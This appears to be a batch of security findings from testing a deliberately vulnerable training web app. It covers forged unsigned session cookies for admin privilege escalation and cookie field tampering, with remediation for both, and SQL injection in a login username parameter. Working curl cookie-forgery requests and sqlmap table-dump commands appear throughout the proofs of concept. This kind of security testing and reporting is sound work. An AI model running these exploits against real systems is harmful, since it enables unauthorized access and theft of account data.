Parameter: id (GET) is vulnerable (boolean-based blind, H2 error-based CAST, Generic UNION 3-col). back-end DBMS: H2.

$ sqlmap ... -D public -T auth_users --dump
Result (10 rows, all role=ADMIN):

title: Privilege escalation via unsigned session cookie (Insecure Deserialization LEVEL_2) — attacker-controlled `role` grants ADMIN
description: The application rebuilds its authorization state by Base64-decoding the client-supplied `session_level2` cookie and deserializing it as JSON with no signature and no origin check. The `role` field is read straight out of that untrusted object and used to authorize admin-only functionality. An attacker simply Base64-encodes a JSON object with `"role":"ADMIN"` and is served the admin-only view — full unauthenticated privilege escalation, no valid session or credentials required.
proof_of_concept:
1) Mint a session: POST /VulnerableApp/InsecureDeserialization/LEVEL_2
   -> Set-Cookie: session_level2=eyJ1c2VybmFtZSI6IkFkYW0iLCJyb2xlIjoiVVNFUiIsIm5vdGlmaWNhdGlvbnNFbmFibGVkIjpmYWxzZX0=
   -> decodes to {"username":"Adam","role":"USER","notificationsEnabled":false}

2) Replay with a tampered role (single Base64 of {"username":"Adam","role":"ADMIN","notificationsEnabled":false}):
   $ curl -H 'Cookie: session_level2=eyJ1c2VybmFtZSI6IkFkYW0iLCJyb2xlIjoiQURNSU4iLCJub3RpZmljYXRpb25zRW5hYmxlZCI6ZmFsc2V9' http://172.17.0.1:9090/VulnerableApp/InsecureDeserialization/LEVEL_2
   {"content":"Welcome Adam (ADMIN). Admin tasks: review 3 pending reports, remove 128 flagged listings.","isValid":true}

Baseline with the original cookie returns isValid:false and only USER tasks. No signature, HMAC, or server-side session store is involved.
remediation: Never deserialize authorization state from the client. Store the session server-side and keep only an opaque, unforgeable session identifier in the cookie. If a stateless cookie is required, sign it with HMAC-SHA256 using a server-side secret and verify the signature over the raw bytes BEFORE parsing (constant-time compare), rejecting any unverified cookie.
verification_method: Re-ran the forged-cookie request twice and compared against the baseline USER-session response
verification_notes: Reproduced: forged role=ADMIN cookie flips isValid false->true and returns admin-only task list; original cookie does not. No authentication needed beyond a freely-minted session cookie.

title: Attacker-controlled field injection via unsigned preferences cookie (Insecure Deserialization LEVEL_1) — arbitrary object state accepted
description: The endpoint trusts a Base64-encoded, unsigned JSON cookie (`preferences_level1`) and deserializes it into the application's preferences object. Because there is no signature or schema restriction, an attacker fully controls every field of the resulting object — they can set `theme` (and any other property) to values the UI never offers. The server accepts and reflects the attacker-supplied object state verbatim, confirming the deserialization trust boundary is broken and is the same primitive that enables the role-forgery privilege escalation at LEVEL_2.
proof_of_concept:
1) Save preferences normally:
   $ curl -X POST -F 'theme=dark' http://172.17.0.1:9090/VulnerableApp/InsecureDeserialization/LEVEL_1
   -> Set-Cookie: preferences_level1=eyJ0aGVtZSI6ImRhcmsiLCJub3RpZmljYXRpb25zRW5hYmxlZCI6ZmFsc2V9   ({"theme":"dark","notificationsEnabled":false})
   -> GET returns: {"content":"Theme: dark, notifications off.","isValid":false}

2) Tamper the cookie to a value the dropdown never offers:
   $ curl -H 'Cookie: preferences_level1=<base64 of {"theme":"ATTACKER_CONTROLLED","notificationsEnabled":false}>' .../LEVEL_1
   -> {"content":"Theme: ATTACKER_CONTROLLED, notifications off.","isValid":true}

The isValid flag flips from false to true purely from attacker-supplied cookie bytes, proving the server deserializes untrusted input into its object graph with no integrity check.
remediation: Sign the cookie with an HMAC over the raw payload and verify before parsing; bind the payload to a fixed DTO with an allow-list of known properties (disable Jackson's default typing / @class on this path) so unknown or attacker-invented fields are rejected.
verification_method: Re-ran tampered vs. untampered cookie and compared server state reflection
verification_notes: Server echoes attacker-chosen `theme` value and flips isValid to true; a malformed (non-conforming) cookie is rejected with a deserialization error, confirming the JSON is being bound to a typed object.

title: Second, independent SQL Injection vector in AuthenticationVulnerability/LEVEL_1 `username` parameter — UNION-extractable credential dump
description: The login form at AuthenticationVulnerability/LEVEL_1 has TWO separate injectable parameters, not just the documented `password`. sqlmap confirmed the `username` parameter itself is injectable via OR boolean-based blind, H2 error-based (CAST) and Generic UNION query with 8 columns. This is a materially different attack path from the already-reported password-parameter bypass: because `username` feeds a UNION-selectable 8-column SELECT, an attacker can directly control the returned row set and extract arbitrary columns from arbitrary tables without needing any valid account or any prior authentication. Confirmed by dumping PUBLIC.AUTH_USERS.USERNAME through this parameter alone (with password=test, i.e. a completely invalid credential pair). Two distinct injection points means fixing only the password parameter would leave the endpoint fully exploitable.
proof_of_concept:

=> Parameter: username (GET)

     Type: error-based          Title: H2 AND error-based - WHERE, HAVING, ORDER BY, GROUP BY clause (CAST)
     Type: UNION query          Title: Generic UNION query (NULL) - 8 columns
   back-end DBMS: H2

2) Data extraction through the username UNION vector (invalid password "test"):
$ sqlmap ... -p username --technique=U --union-cols=8 --string="admin" -D PUBLIC -T AUTH_USERS -C username --dump
Table: PUBLIC.AUTH_USERS
+---------------+
| USERNAME      |
+---------------+
| admin_sqli    |
| admin_logs    |
| admin_plain   |
| admin_md5     |
| admin_sha1    |
| admin_sha256  |
| admin_enum    |
| admin_weak    |
| admin_secure  |

+---------------+   (10 rows)

Note the request used password=test, so no login succeeded — the extraction happened purely through the injected username.
